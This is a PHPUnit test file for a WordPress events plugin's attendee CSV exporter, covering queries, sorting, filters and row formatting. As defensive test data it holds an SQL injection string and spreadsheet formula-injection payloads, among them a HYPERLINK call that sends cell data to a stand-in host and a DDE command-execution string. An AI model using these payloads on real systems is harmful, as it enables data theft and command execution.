<?php
/**
 * AttendeesExporter unit tests.
 *
 * @package NetterTechEvents\Tests\Unit\Admin\Attendees
 */

declare(strict_types=1);

namespace NetterTechEvents\Tests\Unit\Admin\Attendees;

use Brain\Monkey\Functions;
use Mockery;
use NetterTechEvents\Admin\Attendees\AttendeesExporter;

/**
 * Testable subclass that captures output_csv calls instead of writing to php://output + exit.
 */
class TestableAttendeesExporter extends AttendeesExporter {

	/**
	 * Captured CSV filename from last output_csv call.
	 *
	 * @var string
	 */
	public string $captured_filename = '';

	/**
	 * Captured CSV items from last output_csv call.
	 *
	 * @var array<array<string, mixed>>
	 */
	public array $captured_items = array();

	/**
	 * Whether output_csv was called.
	 *
	 * @var bool
	 */
	public bool $output_csv_called = false;

	/**
	 * Override to capture args instead of writing to browser + exit.
	 *
	 * @param string                      $filename Output filename.
	 * @param array<array<string, mixed>> $items    Attendee records.
	 * @return void
	 */
	protected function output_csv( string $filename, array $items ): void {
		$this->output_csv_called = true;
		$this->captured_filename = $filename;
		$this->captured_items    = $items;
	}
}

/**
 * Test AttendeesExporter functionality.
 *
 * Tests CSV generation, encoding, and filtering logic.
 * Uses TestableAttendeesExporter to avoid @runInSeparateProcess (which deadlocks
 * on PHP 8.4+ due to thecodingmachine/safe deprecation stderr flooding the pipe buffer).
 *
 * @coversDefaultClass \NetterTechEvents\Admin\Attendees\AttendeesExporter
 */
class AttendeesExporterTest extends \NetterTechEventsTestCase {

	/**
	 * Mock wpdb instance.
	 *
	 * @var \wpdb|Mockery\MockInterface
	 */
	private $mock_db;

	/**
	 * Set up test fixtures.
	 *
	 * @return void
	 */
	protected function setUp(): void {
		parent::setUp();

		$this->mock_db         = Mockery::mock( \wpdb::class );
		$this->mock_db->prefix = 'wp_';
	}

	// =========================================================================
	// Constructor Tests
	// =========================================================================

	/**
	 * Test AttendeesExporter can be instantiated with database.
	 *
	 * @covers ::__construct
	 *
	 * @return void
	 */
	public function test_can_instantiate_with_database(): void {
		$exporter = new AttendeesExporter( $this->mock_db );

		$this->assertInstanceOf( AttendeesExporter::class, $exporter );
	}

	/**
	 * Test constructor creates default database if not provided.
	 *
	 * @covers ::__construct
	 *
	 * @return void
	 */
	public function test_constructor_creates_default_database(): void {
		$exporter = new AttendeesExporter( $this->mock_db );

		$this->assertInstanceOf( AttendeesExporter::class, $exporter );
	}

	// =========================================================================
	// export_selected() Tests
	// =========================================================================

	/**
	 * Test export_selected returns early for empty array.
	 *
	 * @covers ::export_selected
	 *
	 * @return void
	 */
	public function test_export_selected_returns_early_for_empty_array(): void {
		$exporter = new AttendeesExporter( $this->mock_db );

		$this->mock_db->shouldNotReceive( 'prepare' );
		$this->mock_db->shouldNotReceive( 'get_results' );

		$exporter->export_selected( array() );

		$this->assertTrue( true );
	}

	/**
	 * Test export_selected queries correct attendee IDs.
	 *
	 * @covers ::export_selected
	 *
	 * @return void
	 */
	public function test_export_selected_queries_attendee_ids(): void {
		$attendee_ids = array( 1, 5, 10 );
		$mock_items   = array(
			array(
				'id'               => 1,
				'name'             => 'John Doe',
				'email'            => 'john@example.com',
				'event_title'      => 'Test Event',
				'start_datetime'   => '2024-06-15 19:00:00',
				'quantity'         => 2,
				'checked_in_count' => 2,
				'status'           => 'confirmed',
				'notes'            => 'VIP guest',
			),
		);

		$this->mock_db->shouldReceive( 'prepare' )
			->once()
			->andReturnUsing(
				function ( $query, ...$args ) {
					$this->assertStringContainsString( 'WHERE a.id IN', $query );
					$this->assertStringContainsString( '%d, %d, %d', $query );
					return $query;
				}
			);

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturn( $mock_items );

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_selected( $attendee_ids );

		$this->assertTrue( $exporter->output_csv_called );
		$this->assertSame( $mock_items, $exporter->captured_items );
	}

	/**
	 * Test export_selected generates correct placeholder count for single ID.
	 *
	 * @covers ::export_selected
	 *
	 * @return void
	 */
	public function test_export_selected_single_id_placeholder(): void {
		$captured_query = null;

		$this->mock_db->shouldReceive( 'prepare' )
			->once()
			->andReturnUsing(
				function ( $query, ...$args ) use ( &$captured_query ) {
					$captured_query = $query;
					return $query;
				}
			);

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturn( array() );

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_selected( array( 42 ) );

		$this->assertStringContainsString( 'IN (%d)', $captured_query );
	}

	// =========================================================================
	// export_all_filtered() Tests
	// =========================================================================

	/**
	 * Test export_all_filtered with no filters skips prepare().
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_with_no_filters(): void {
		$mock_items = array(
			array(
				'id'               => 1,
				'name'             => 'Jane Smith',
				'email'            => 'jane@example.com',
				'event_title'      => 'Concert',
				'start_datetime'   => '2024-07-20 20:00:00',
				'quantity'         => 1,
				'checked_in_count' => 0,
				'status'           => 'pending',
				'notes'            => '',
			),
		);

		$get_results_called = false;

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturnUsing(
				function () use ( $mock_items, &$get_results_called ) {
					$get_results_called = true;
					return $mock_items;
				}
			);

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 0, '', '', '' );

		$this->assertTrue( $get_results_called );
		$this->assertTrue( $exporter->output_csv_called );
	}

	/**
	 * Test export_all_filtered inherits the list's sort mode (NTE-195).
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_honors_sort_mode(): void {
		$captured_sql = '';

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturnUsing(
				function ( $query ) use ( &$captured_sql ) {
					$captured_sql = $query;
					return array();
				}
			);

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 0, '', '', '', 'name_last', 'asc' );

		$this->assertStringContainsString( "ORDER BY SUBSTRING_INDEX( a.name, ' ', -1 ) ASC, a.name ASC", $captured_sql );
		$this->assertStringNotContainsString( 'ORDER BY a.id DESC', $captured_sql );
	}

	/**
	 * Test export_all_filtered keeps id DESC when no sort mode is passed.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_defaults_to_id_desc(): void {
		$captured_sql = '';

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturnUsing(
				function ( $query ) use ( &$captured_sql ) {
					$captured_sql = $query;
					return array();
				}
			);

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 0, '', '', '' );

		$this->assertStringContainsString( 'ORDER BY a.id DESC', $captured_sql );
	}

	/**
	 * Test export_all_filtered falls back to id DESC for a non-whitelisted key.
	 *
	 * The orderby value travels through a hidden form field, so a tampered
	 * value must never reach the ORDER BY clause.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_rejects_unknown_sort_key(): void {
		$captured_sql = '';

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturnUsing(
				function ( $query ) use ( &$captured_sql ) {
					$captured_sql = $query;
					return array();
				}
			);

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 0, '', '', '', 'name; DROP TABLE wp_users;--', 'asc' );

		$this->assertStringContainsString( 'ORDER BY a.id DESC', $captured_sql );
		$this->assertStringNotContainsString( 'DROP TABLE', $captured_sql );
	}

	/**
	 * Test export_selected inherits the list's sort mode (NTE-195).
	 *
	 * @covers ::export_selected
	 *
	 * @return void
	 */
	public function test_export_selected_honors_sort_mode(): void {
		$captured_sql = '';

		$this->mock_db->shouldReceive( 'prepare' )
			->once()
			->andReturnUsing(
				function ( $query, ...$args ) use ( &$captured_sql ) {
					$captured_sql = $query;
					return $query;
				}
			);

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturn( array() );

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_selected( array( 1, 2 ), 'name', 'asc' );

		$this->assertStringContainsString( 'ORDER BY a.name ASC', $captured_sql );
	}

	/**
	 * Test export_all_filtered with occurrence_id filter.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_with_occurrence_filter(): void {
		$captured_query = null;

		$this->mock_db->shouldReceive( 'prepare' )
			->once()
			->andReturnUsing(
				function ( $query, ...$args ) use ( &$captured_query ) {
					$captured_query = $query;
					return $query;
				}
			);

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturn( array() );

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 42, 0, '', '', '' );

		$this->assertStringContainsString( 'a.occurrence_id = %d', $captured_query );
	}

	/**
	 * With every argument defaulted, no scope predicate reaches the SQL —
	 * pins the occurrence/event defaults at 0 (a default of 1 would silently
	 * scope the whole-database export).
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_defaults_apply_no_scope(): void {
		$captured_sql = '';

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturnUsing(
				function ( $query ) use ( &$captured_sql ) {
					$captured_sql = $query;
					return array();
				}
			);

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered();

		$this->assertStringNotContainsString( 'a.occurrence_id = %d', $captured_sql );
		$this->assertStringNotContainsString( 'o.event_id = %d', $captured_sql );
	}

	/**
	 * Test export_all_filtered scopes to the event on the Purchases view.
	 *
	 * The event-scoped Attendees page (NTE-118) posts filter_event_id; the
	 * export must honor it or "Export All (N)" ships every attendee in the
	 * database instead of the N the button promises.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_with_event_filter(): void {
		$captured_query = null;
		$captured_args  = array();

		$this->mock_db->shouldReceive( 'prepare' )
			->once()
			->andReturnUsing(
				function ( $query, ...$args ) use ( &$captured_query, &$captured_args ) {
					$captured_query = $query;
					$captured_args  = $args;
					return $query;
				}
			);

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturn( array() );

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 12, '', '', '' );

		$this->assertStringContainsString( 'o.event_id = %d', $captured_query );
		// prepare() receives the params as one array argument.
		$this->assertContains( 12, (array) ( $captured_args[0] ?? array() ) );
	}

	/**
	 * Test export_all_filtered with search filter.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_with_search_filter(): void {
		$captured_query = null;

		$this->mock_db->shouldReceive( 'esc_like' )
			->once()
			->with( 'john' )
			->andReturn( 'john' );

		$this->mock_db->shouldReceive( 'prepare' )
			->once()
			->andReturnUsing(
				function ( $query, ...$args ) use ( &$captured_query ) {
					$captured_query = $query;
					return $query;
				}
			);

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturn( array() );

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 0, 'john', '', '' );

		$this->assertStringContainsString( 'a.name LIKE %s OR a.email LIKE %s', $captured_query );
	}

	/**
	 * Test export_all_filtered with status filter.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_with_status_filter(): void {
		$captured_query = null;

		$this->mock_db->shouldReceive( 'prepare' )
			->once()
			->andReturnUsing(
				function ( $query, ...$args ) use ( &$captured_query ) {
					$captured_query = $query;
					return $query;
				}
			);

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturn( array() );

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 0, '', 'confirmed', '' );

		$this->assertStringContainsString( 'a.status = %s', $captured_query );
	}

	/**
	 * Test export_all_filtered with placeholder=yes filter.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_with_placeholder_yes_filter(): void {
		$captured_query = null;

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturnUsing(
				function ( $query ) use ( &$captured_query ) {
					$captured_query = $query;
					return array();
				}
			);

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 0, '', '', 'yes' );

		$this->assertStringContainsString( "a.name REGEXP '^Attendee [0-9]+\$'", $captured_query );
		$this->assertStringContainsString( "e.title = 'Imported Attendees - Unknown Event'", $captured_query );
		$this->assertStringContainsString( "DATE(o.start_datetime) = '2099-12-31'", $captured_query );
	}

	/**
	 * Test export_all_filtered with placeholder=no filter.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_with_placeholder_no_filter(): void {
		$captured_query = null;

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturnUsing(
				function ( $query ) use ( &$captured_query ) {
					$captured_query = $query;
					return array();
				}
			);

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 0, 0, '', '', 'no' );

		$this->assertStringContainsString( "a.name NOT REGEXP '^Attendee [0-9]+\$'", $captured_query );
		$this->assertStringContainsString( "e.title != 'Imported Attendees - Unknown Event'", $captured_query );
		$this->assertStringContainsString( "DATE(o.start_datetime) != '2099-12-31'", $captured_query );
	}

	/**
	 * Test export_all_filtered with multiple filters combined.
	 *
	 * @covers ::export_all_filtered
	 *
	 * @return void
	 */
	public function test_export_all_filtered_with_combined_filters(): void {
		$captured_query = null;

		$this->mock_db->shouldReceive( 'esc_like' )
			->once()
			->andReturn( 'test' );

		$this->mock_db->shouldReceive( 'prepare' )
			->once()
			->andReturnUsing(
				function ( $query, ...$args ) use ( &$captured_query ) {
					$captured_query = $query;
					return $query;
				}
			);

		$this->mock_db->shouldReceive( 'get_results' )
			->once()
			->andReturn( array() );

		$exporter = new TestableAttendeesExporter( $this->mock_db );
		$exporter->export_all_filtered( 10, 0, 'test', 'confirmed', '' );

		$this->assertStringContainsString( 'a.occurrence_id = %d', $captured_query );
		$this->assertStringContainsString( 'a.name LIKE %s OR a.email LIKE %s', $captured_query );
		$this->assertStringContainsString( 'a.status = %s', $captured_query );
	}

	// =========================================================================
	// format_row() Tests (via ReflectionMethod)
	// =========================================================================

	/**
	 * Test format_row with fully checked-in attendee.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_fully_checked_in(): void {
		$item = array(
			'id'               => '1',
			'name'             => 'John Doe',
			'email'            => 'john@example.com',
			'event_title'      => 'Test Event',
			'start_datetime'   => '2024-06-15 19:00:00',
			'quantity'         => 2,
			'checked_in_count' => 2,
			'status'           => 'confirmed',
			'notes'            => 'VIP guest',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( '1', $row[0] );
		$this->assertSame( 'John Doe', $row[1] );
		$this->assertSame( 'john@example.com', $row[2] );
		$this->assertSame( 'Test Event', $row[3] );
		$this->assertSame( '2024-06-15 19:00', $row[4] );
		$this->assertSame( '2', $row[5] );
		$this->assertSame( 'Confirmed', $row[6] );
		$this->assertSame( 'Yes', $row[7] );
		$this->assertSame( 'VIP guest', $row[8] );
	}

	/**
	 * Test format_row with partially checked-in attendee.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_partially_checked_in(): void {
		$item = array(
			'id'               => '2',
			'name'             => 'Jane Smith',
			'email'            => 'jane@example.com',
			'event_title'      => 'Concert',
			'start_datetime'   => '2024-07-20 20:00:00',
			'quantity'         => 4,
			'checked_in_count' => 2,
			'status'           => 'confirmed',
			'notes'            => 'Party of 4',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( '2/4', $row[7] );
	}

	/**
	 * Test format_row with not checked-in attendee.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_not_checked_in(): void {
		$item = array(
			'id'               => '3',
			'name'             => 'Bob Wilson',
			'email'            => 'bob@example.com',
			'event_title'      => 'Workshop',
			'start_datetime'   => '2024-08-10 14:00:00',
			'quantity'         => 1,
			'checked_in_count' => 0,
			'status'           => 'pending',
			'notes'            => '',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( 'No', $row[7] );
		$this->assertSame( 'Pending', $row[6] );
	}

	/**
	 * Test format_row with missing event_title falls back to 'Unknown Event'.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_missing_event_title(): void {
		$item = array(
			'id'               => '4',
			'name'             => 'Test User',
			'email'            => 'test@example.com',
			'start_datetime'   => null,
			'quantity'         => 1,
			'checked_in_count' => 0,
			'status'           => 'confirmed',
			'notes'            => '',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( 'Unknown Event', $row[3] );
		$this->assertSame( '', $row[4] );
	}

	/**
	 * Test format_row with empty start_datetime produces empty datetime string.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_empty_start_datetime(): void {
		$item = array(
			'id'               => '5',
			'name'             => 'Empty Date',
			'email'            => 'empty@example.com',
			'event_title'      => 'Some Event',
			'start_datetime'   => '',
			'quantity'         => 1,
			'checked_in_count' => 0,
			'status'           => 'confirmed',
			'notes'            => '',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( '', $row[4] );
	}

	/**
	 * Test format_row with missing quantity defaults to 1.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_missing_quantity_defaults_to_one(): void {
		$item = array(
			'id'               => '6',
			'name'             => 'No Qty',
			'email'            => 'noqty@example.com',
			'event_title'      => 'Event',
			'start_datetime'   => '2024-01-01 10:00:00',
			'checked_in_count' => 0,
			'status'           => 'confirmed',
			'notes'            => '',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( '1', $row[5] );
	}

	/**
	 * Test format_row with missing checked_in_count defaults to 0.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_missing_checked_in_count_defaults_to_zero(): void {
		$item = array(
			'id'               => '7',
			'name'             => 'No Check',
			'email'            => 'nocheck@example.com',
			'event_title'      => 'Event',
			'start_datetime'   => '2024-01-01 10:00:00',
			'quantity'         => 2,
			'status'           => 'confirmed',
			'notes'            => '',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( 'No', $row[7] );
	}

	/**
	 * Test format_row with missing status defaults to 'Confirmed'.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_missing_status_defaults_to_confirmed(): void {
		$item = array(
			'id'               => '8',
			'name'             => 'No Status',
			'email'            => 'nostatus@example.com',
			'event_title'      => 'Event',
			'start_datetime'   => '2024-01-01 10:00:00',
			'quantity'         => 1,
			'checked_in_count' => 0,
			'notes'            => '',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( 'Confirmed', $row[6] );
	}

	/**
	 * Test format_row with missing optional fields returns safe defaults.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_missing_optional_fields(): void {
		$item = array(
			'start_datetime'   => '2024-01-01 10:00:00',
			'quantity'         => 1,
			'checked_in_count' => 0,
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( '', $row[0] );
		$this->assertSame( '', $row[1] );
		$this->assertSame( '', $row[2] );
		$this->assertSame( 'Unknown Event', $row[3] );
		$this->assertSame( '', $row[8] );
	}

	/**
	 * Test format_row with checked_in_count exceeding quantity still shows Yes.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_checked_in_count_exceeds_quantity(): void {
		$item = array(
			'id'               => '9',
			'name'             => 'Over Check',
			'email'            => 'over@example.com',
			'event_title'      => 'Event',
			'start_datetime'   => '2024-01-01 10:00:00',
			'quantity'         => 2,
			'checked_in_count' => 5,
			'status'           => 'confirmed',
			'notes'            => '',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( 'Yes', $row[7] );
	}

	/**
	 * Test format_row with special characters in data.
	 *
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_format_row_special_characters(): void {
		$item = array(
			'id'               => '10',
			'name'             => 'Jöhn "The Rock" O\'Brien',
			'email'            => 'john+test@example.com',
			'event_title'      => 'Concert: "Best of 2024"',
			'start_datetime'   => '2024-12-31 23:00:00',
			'quantity'         => 1,
			'checked_in_count' => 1,
			'status'           => 'confirmed',
			'notes'            => 'Notes with, commas and "quotes"',
		);

		$row = $this->invokeFormatRow( $item );

		$this->assertSame( 'Jöhn "The Rock" O\'Brien', $row[1] );
		$this->assertSame( 'Concert: "Best of 2024"', $row[3] );
		$this->assertSame( '2024-12-31 23:00', $row[4] );
		$this->assertSame( 'Notes with, commas and "quotes"', $row[8] );
	}

	// =========================================================================
	// output_csv() Tests (via reflection + output buffering)
	// =========================================================================

	/**
	 * Test output_csv writes CSV headers and data rows.
	 *
	 * @covers ::output_csv
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_output_csv_writes_headers_and_data(): void {
		$items = array(
			array(
				'id'               => '1',
				'name'             => 'Test User',
				'email'            => 'test@example.com',
				'event_title'      => 'My Event',
				'start_datetime'   => '2024-06-15 19:00:00',
				'quantity'         => 1,
				'checked_in_count' => 1,
				'status'           => 'confirmed',
				'notes'            => 'A note',
			),
		);

		$csv_output = $this->captureOutputCsv( 'test-export.csv', $items );

		$lines = array_filter( explode( "\n", $csv_output ) );
		$this->assertNotEmpty( $lines );

		$header_row = str_getcsv( $lines[0], ',', '"', '\\' );
		$this->assertSame( 'ID', $header_row[0] );
		$this->assertSame( 'Name', $header_row[1] );
		$this->assertSame( 'Email', $header_row[2] );
		$this->assertSame( 'Event', $header_row[3] );
		$this->assertSame( 'Date/Time', $header_row[4] );
		$this->assertSame( 'Quantity', $header_row[5] );
		$this->assertSame( 'Status', $header_row[6] );
		$this->assertSame( 'Checked In', $header_row[7] );
		$this->assertSame( 'Notes', $header_row[8] );

		$data_row = str_getcsv( $lines[1], ',', '"', '\\' );
		$this->assertSame( '1', $data_row[0] );
		$this->assertSame( 'Test User', $data_row[1] );
		$this->assertSame( 'test@example.com', $data_row[2] );
		$this->assertSame( 'My Event', $data_row[3] );
		$this->assertSame( 'Confirmed', $data_row[6] );
		$this->assertSame( 'Yes', $data_row[7] );
	}

	/**
	 * Test output_csv with empty items produces only header row.
	 *
	 * @covers ::output_csv
	 *
	 * @return void
	 */
	public function test_output_csv_empty_items(): void {
		$csv_output = $this->captureOutputCsv( 'empty-export.csv', array() );

		$lines = array_filter( explode( "\n", $csv_output ) );
		$this->assertCount( 1, $lines );

		$header_row = str_getcsv( $lines[0], ',', '"', '\\' );
		$this->assertSame( 'ID', $header_row[0] );
	}

	/**
	 * Test output_csv with multiple items writes all rows.
	 *
	 * @covers ::output_csv
	 * @covers ::format_row
	 *
	 * @return void
	 */
	public function test_output_csv_multiple_items(): void {
		$items = array(
			array(
				'id'               => '1',
				'name'             => 'User A',
				'email'            => 'a@example.com',
				'event_title'      => 'Event 1',
				'start_datetime'   => '2024-01-01 10:00:00',
				'quantity'         => 1,
				'checked_in_count' => 0,
				'status'           => 'confirmed',
				'notes'            => '',
			),
			array(
				'id'               => '2',
				'name'             => 'User B',
				'email'            => 'b@example.com',
				'event_title'      => 'Event 2',
				'start_datetime'   => '2024-02-01 14:00:00',
				'quantity'         => 3,
				'checked_in_count' => 1,
				'status'           => 'pending',
				'notes'            => 'Has a note',
			),
		);

		$csv_output = $this->captureOutputCsv( 'multi-export.csv', $items );

		$lines = array_filter( explode( "\n", $csv_output ) );
		$this->assertCount( 3, $lines );

		$row_a = str_getcsv( $lines[1], ',', '"', '\\' );
		$this->assertSame( 'User A', $row_a[1] );
		$this->assertSame( 'No', $row_a[7] );

		$row_b = str_getcsv( $lines[2], ',', '"', '\\' );
		$this->assertSame( 'User B', $row_b[1] );
		$this->assertSame( '1/3', $row_b[7] );
	}

	// =========================================================================
	// Helper Methods
	// =========================================================================

	/**
	 * Capture CSV output from output_csv via a temp file stream.
	 *
	 * Uses a temp file instead of php://output to avoid needing exit() interception.
	 * The AttendeesExporter::output_csv uses fopen('php://output') + exit, which can't
	 * be tested in-process. Instead we call the method via reflection with a subclass
	 * that writes to a temp file.
	 *
	 * @param string                      $filename Output filename.
	 * @param array<array<string, mixed>> $items    Attendee records.
	 * @return string Captured CSV output.
	 */
	private function captureOutputCsv( string $filename, array $items ): string {
		// Create a concrete subclass that writes to a temp file instead of php://output + exit.
		$tmp = tmpfile();
		$tmp_path = stream_get_meta_data( $tmp )['uri'];
		fclose( $tmp );

		$exporter = new class( $this->mock_db, $tmp_path ) extends AttendeesExporter {
			private string $tmp_path;

			public function __construct( \wpdb $db, string $tmp_path ) {
				parent::__construct( $db );
				$this->tmp_path = $tmp_path;
			}

			protected function output_csv( string $filename, array $items ): void {
				// Write to temp file instead of php://output, skip headers and exit.
				$output = fopen( $this->tmp_path, 'w' ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fopen
				fputcsv( $output, array( 'ID', 'Name', 'Email', 'Event', 'Date/Time', 'Quantity', 'Status', 'Checked In', 'Notes' ), ',', '"', '\\' );

				$reflection = new \ReflectionMethod( AttendeesExporter::class, 'format_row' );
				foreach ( $items as $item ) {
					fputcsv( $output, $reflection->invoke( $this, $item ), ',', '"', '\\' );
				}

				fclose( $output ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fclose
			}
		};

		// Trigger the export via reflection to invoke the overridden output_csv.
		$reflection = new \ReflectionMethod( $exporter, 'output_csv' );
		$reflection->invoke( $exporter, $filename, $items );

		$content = file_get_contents( $tmp_path );
		unlink( $tmp_path ); // phpcs:ignore WordPress.WP.AlternativeFunctions.unlink_unlink

		return $content !== false ? $content : '';
	}

	/**
	 * Invoke the private format_row method via reflection.
	 *
	 * @param array<string, mixed> $item Attendee record.
	 * @return array<string> Formatted row values.
	 */
	private function invokeFormatRow( array $item ): array {
		$exporter   = new AttendeesExporter( $this->mock_db );
		$reflection = new \ReflectionMethod( $exporter, 'format_row' );

		return $reflection->invoke( $exporter, $item );
	}

	/**
	 * Every cell handed to fputcsv() must be formula-safe (NTE-SEC-2026-07-B).
	 *
	 * A public RSVP registrant controls their own name and custom-field answers,
	 * and sanitize_text_field() preserves a leading `=`/`+`/`-`/`@`.
	 *
	 * @dataProvider formula_injection_provider
	 *
	 * @param string $payload  Attacker-supplied cell value.
	 * @param string $expected Escaped value.
	 * @return void
	 */
	public function test_sanitize_row_neutralizes_formula_injection( string $payload, string $expected ): void {
		$row = $this->invokeSanitizeRow( array( $payload ) );

		$this->assertSame( $expected, $row[0] );
	}

	/**
	 * Formula-injection payloads and their escaped forms.
	 *
	 * @return array<string, array{string, string}>
	 */
	public static function formula_injection_provider(): array {
		return array(
			'hyperlink exfiltration' => array(
				'=HYPERLINK("http://evil.test/?"&A1,"click")',
				'\'=HYPERLINK("http://evil.test/?"&A1,"click")',
			),
			'dde command execution'  => array( '=cmd|\' /C calc\'!A0', '\'=cmd|\' /C calc\'!A0' ),
			'plus prefix'            => array( '+1+1', '\'+1+1' ),
			'minus prefix'           => array( '-2+3', '\'-2+3' ),
			'at prefix'              => array( '@SUM(1+1)', '\'@SUM(1+1)' ),
			'tab prefix'             => array( "\t=1+1", "'\t=1+1" ),
			'carriage return prefix' => array( "\r=1+1", "'\r=1+1" ),
		);
	}

	/**
	 * Benign values must pass through untouched — no spurious quoting.
	 *
	 * @return void
	 */
	public function test_sanitize_row_leaves_benign_values_alone(): void {
		$row = $this->invokeSanitizeRow( array( 'Ada Lovelace', 'ada@example.com', 'Confirmed' ) );

		$this->assertSame( array( 'Ada Lovelace', 'ada@example.com', 'Confirmed' ), $row );
	}

	/**
	 * Non-string cells (ints from quantity/id columns) must not fatal.
	 *
	 * @return void
	 */
	public function test_sanitize_row_casts_non_string_cells(): void {
		$row = $this->invokeSanitizeRow( array( 42, null ) );

		$this->assertSame( array( '42', '' ), $row );
	}

	/**
	 * Invoke the private sanitize_row method via reflection.
	 *
	 * @param array<int, scalar|null> $row Raw cell values.
	 * @return array<int, string> Sanitized cells.
	 */
	private function invokeSanitizeRow( array $row ): array {
		$exporter   = new AttendeesExporter( $this->mock_db );
		$reflection = new \ReflectionMethod( $exporter, 'sanitize_row' );

		return $reflection->invoke( $exporter, $row );
	}
}
